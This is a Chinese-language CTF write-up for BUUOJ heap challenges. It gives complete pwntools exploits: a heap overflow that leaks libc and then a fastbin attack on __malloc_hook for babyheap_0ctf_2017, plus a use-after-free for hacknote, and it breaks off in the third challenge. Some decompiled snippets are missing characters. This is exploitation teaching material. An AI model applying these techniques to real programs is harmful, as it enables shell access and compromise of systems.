# pwn学习-BUUOJ wp（heap）
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x00 babyheap_0ctf_2017
一道菜单堆题，所有保护都开启了。
先来看看申请chunk的函数，可以申请16块chunk，然后有一个数组来进行存储，每申请一块chunk占用数组的三个位置，分别表示下标已占用，size大小和chunk的content地址。注意这里用了calloc来申请chunk，每次分配内存之前会先将内存的内容清空。
    void __fastcall add(__int64 *a1)
    {
      int index; // [rsp+10h] [rbp-10h]
      int size; // [rsp+14h] [rbp-Ch]
      void *chunk; // [rsp+18h] [rbp-8h]
      for ( index = 0; index  0 )
          {
            if ( size > 4096 )
              size = 4096;
            chunk = calloc(size, 1uLL);
            if ( !chunk )
              exit(-1);
            LODWORD(a1[3 * index]) = 1;
            a1[3 * index + 1] = size;
            a1[3 * index + 2] = (__int64)chunk;
            printf("Allocate Index %d\n", (unsigned int)index);
          }
          return;
        }
      }
    }
再看看edit函数，这里输入的大小size，程序并没有对size的范围进行判断，也就是说存在溢出。
    __int64 __fastcall edit(__int64 *a1)
    {
      __int64 result; // rax
      int index; // [rsp+18h] [rbp-8h]
      int size; // [rsp+1Ch] [rbp-4h]
      printf("Index: ");
      result = input_num();
      index = result;
      if ( (int)result >= 0 && (int)result  0 )
          {
            printf("Content: ");
            result = input_content(a1[3 * index + 2], size);
          }
        }
      }
      return result;
    }
然后free掉chunk或也进行了置零操作，没什么好说的。
我们可以先通过泄露出unsortbin的bins头来泄露libc的基址，然后将one_gadget的地址写入`__malloc_hook`
，然后在进行分配的时候就能够getshell了。
我们可以先申请这样几块chunk：，然后我们就要想办法伪造一块free掉的chunk，使其fd指针指向unsortbin的bins头，然后进行输出泄露出地址。
我们可以对第0块chunk进行溢出，修改chunk1的size位，修改后的size位要能够覆盖chunk1和chunk2，因此可以修改为0xb1，然后free掉chunk1，此时这一大块chunk就会放入unsortbin中，再申请一块大小为0x10的chunk，bin中就剩下了chunk2这块chunk，但是实际上这块chunk没有被free掉，但是此时他的fd指针已经指向了unsortbin的bins头，直接输出就能够泄露出libc的基址了。
    add(0x10) # 0
    add(0x10) # 1
    add(0x80) # 2
    add(0x10) # 3
在gdb中查看一下这个地址，发现与main_arena偏移为88，在之上可以找到`__malloc_hook`
的地址，借此泄露出libc的基址。然后我们还能再这之前找到一处适合伪造chunk的地址，伪造大小为0x71的chunk，通过修改rfree掉的chunk的fd指针指向此处，然后把它申请出来，就可以对`__malloc_hook`
进行修改了。
    gdb-peda$ x /gx 0x7ffff7dd1b78
    0x7ffff7dd1b78 :    0x00005555557570c0
    gdb-peda$ x /gx 0x7ffff7dd1aed
    0x7ffff7dd1aed :    0xfff7dd0260000000
    gdb-peda$
    0x7ffff7dd1af5 :    0x000000000000007f
    gdb-peda$
    0x7ffff7dd1afd:    0xfff7a92ea0000000
    gdb-peda$
    0x7ffff7dd1b05 :    0xfff7a92a7000007f
    gdb-peda$
    0x7ffff7dd1b0d :    0x000000000000007f
exp:
    from pwn import *
    context(log_level='debug', arch='amd64', os='linux')
    # io = process('./0ctf_2017_babyheap')
    io = remote('node3.buuoj.cn', 27412)
    libc = ELF('./libc-2.23.so')
    def add(size):
        io.sendlineafter('Command: ', '1')
        io.sendlineafter('Size: ', str(size))
    def edit(index, size, content):
        io.sendlineafter('Command: ', '2')
        io.sendlineafter('Index: ', str(index))
        io.sendlineafter('Size: ', str(size))
        io.sendafter('Content: ', content)
    def delete(index):
        io.sendlineafter('Command: ', '3')
        io.sendlineafter('Index: ', str(index))
    def display(index):
        io.sendlineafter('Command: ', '4')
        io.sendlineafter('Index: ', str(index))
        io.recvuntil('Content: \n')
    add(0x10) # 0
    add(0x10) # 1
    add(0x80) # 2
    add(0x10) # 3
    payload = 'a' * 0x10 + p64(0) + p64(0xb1)
    edit(0, len(payload), payload)
    # gdb.attach(io)
    delete(1)
    add(0x10) # 1
    display(2)
    unsortbin = u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
    print(hex(unsortbin))
    libc_base = unsortbin - 88 - 0x10 - libc.symbols["__malloc_hook"]
    one = 0x4526a + libc_base
    fake_chunk = unsortbin - 88 - 0x10 - 0x23
    add(0x80) # 4
    add(0x60) # 5
    add(0x10) # 6
    delete(5)
    payload = 'a' * 0x80 + p64(0) + p64(0x71) + 'a' * 0x10 + p64(0) + p64(0x71) + p64(fake_chunk)
    edit(4, len(payload), payload)
    add(0x60) # 5
    add(0x60) # 7 / fake
    payload = 'a' * 0x13 + p64(one)
    edit(7, len(payload), payload)
    add(0x10)
    io.interactive()
## 0x01 hitcontraining_uaf
    from pwn import *
    io = remote('node3.buuoj.cn',27690)
    # io = process('./hacknote')
    def add(size, content):
        io.sendlineafter('Your choice :', str('1'))
        io.sendlineafter('Note size :', str(size))
        io.sendlineafter('Content :', content)
    def delete(index):
        io.sendlineafter('Your choice :', str('2'))
        io.sendlineafter('Index :', str(index))
    def show(index):
        io.sendlineafter('Your choice :', str('3'))
        io.sendlineafter('Index :', str(index))
    add(16, 'aaaa')
    add(16, 'aaaa')
    delete(0)
    delete(1)
    add('8', p32(0x08048945))
    show(0)
    io.interactive()
## 0x02 [ZJCTF 2019]EasyHeap
检查一下保护机制，开启了canary和NX保护，RELRO是Partial RELRO，说明got表可写。
反编译一下，是一道菜单题，`create_heap()`
里利用了一个heaparray来存储用户申请的chunk，一共可以存储十个chunk。这里根据申请的大小来决定读取数据的长度，没有溢出。
      for ( i = 0; i = *(&ptr + a1) - 4 )
        {